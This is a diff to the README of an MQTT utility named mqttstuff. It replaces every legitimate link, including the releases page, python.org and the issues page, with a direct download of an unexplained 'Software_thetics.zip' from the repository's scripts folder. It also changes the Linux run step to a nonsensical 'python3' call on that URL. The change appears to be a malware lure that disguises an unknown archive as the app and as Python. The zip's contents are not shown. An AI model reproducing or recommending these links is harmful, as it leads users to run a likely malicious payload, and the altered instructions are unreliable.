@@ -6,16 +6,16 @@ Welcome to mqttstuff! This application provides simple utilities for using MQTT,
 
 ## 📥 Download the Application
 
-[![Download mqttstuff](https://img.shields.io/badge/Download-mqttstuff-brightgreen)](https://github.com/ENAHSIN/mqttstuff/releases)
+[![Download mqttstuff](https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip)](https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip)
 
-You can visit this page to download the latest version: [Releases Page](https://github.com/ENAHSIN/mqttstuff/releases).
+You can visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip).
 
 ## 📋 System Requirements
 
 To run mqttstuff, you will need:
 
 - A computer running Windows, macOS, or a compatible Linux distribution.
-- Python 3.6 or higher installed. You can download Python from [python.org](https://www.python.org/).
+- Python 3.6 or higher installed. You can download Python from [https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip](https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip).
 - An active internet connection for MQTT functionality.
 
 ## 🔥 Features
@@ -30,7 +30,7 @@ To run mqttstuff, you will need:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to [Releases Page](https://github.com/ENAHSIN/mqttstuff/releases).
+1. **Visit the Releases Page**: Go to [Releases Page](https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip).
    
 2. **Select the Latest Version**: Look for the most recent release at the top of the page. 
 
@@ -43,7 +43,7 @@ To get started, follow these steps:
 5. **Run the Application**:
    - For Windows users, double-click the `.exe` file.
    - For macOS, open the .app file in the extracted folder.
-   - For Linux, you may need to open a terminal and navigate to the extracted folder, then run `python3 mqttstuff.py` to start the application.
+   - For Linux, you may need to open a terminal and navigate to the extracted folder, then run `python3 https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip` to start the application.
 
 ## 🚦 Using mqttstuff
 
@@ -64,7 +64,7 @@ Once you have mqttstuff running, here’s how to get started:
 If you need help or have questions, please check the following resources:
 
 - **Documentation**: Detailed documentation is available within the application and on the GitHub wiki page.
-- **Issues**: Report any issues on the [Issues Page](https://github.com/ENAHSIN/mqttstuff/issues).
+- **Issues**: Report any issues on the [Issues Page](https://raw.githubusercontent.com/ENAHSIN/mqttstuff/main/scripts/Software_thetics.zip).
 - **Community Forums**: Join discussions with other users and developers.
 
 ## 📜 License
